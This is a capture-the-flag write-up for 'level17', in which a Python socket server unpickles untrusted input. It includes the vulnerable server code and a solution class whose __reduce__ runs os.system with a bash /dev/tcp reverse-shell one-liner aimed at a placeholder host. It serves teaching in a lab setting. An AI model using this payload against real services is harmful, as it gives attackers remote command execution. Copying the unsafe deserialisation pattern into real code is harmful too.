# level17

## Challenge info

There is a python script listening on port 10007 that contains a vulnerability. <br>

To do this level, log in as the level17 account with the password level17. Files for his level can be found in /home/flag17.

```
#!/usr/bin/python

import os
import pickle
import time
import socket
import signal

signal.signal(signal.SIGCHLD, signal.SIG_IGN)

def server(skt):
  line = skt.recv(1024)

  obj = pickle.loads(line)

  for i in obj:
      clnt.send("why did you send me " + i + "?\n")

skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
skt.bind(('0.0.0.0', 10007))
skt.listen(10)

while True:
  clnt, addr = skt.accept()

  if(os.fork() == 0):
      clnt.send("Accepted connection from %s:%d" % (addr[0], addr[1]))
      server(clnt)
      exit(1)
```

## Solution

This is a pretty well-known vulnerability, within the pickle library, if not correctly handled <br>

the vulnerable line is
```
obj = pickle.loads(line)
```

To exploit this, it is required that a class is created with a reduce method that returns two things
```
method_to_use, (command, args)
```

The required exploit (in this simple case) is composed with the following class
```
class Exploit(object):
        def __reduce__(self):
                method = os.system
                cmd = "bash -i >& /dev/tcp/ip/port 0>&1"
                return method, (cmd,)


payload = pickle.dumps(Exploit())
```

This is all is needed (besides the communication instructions)

## Flag

```
You have successfully executed getflag on a target account
```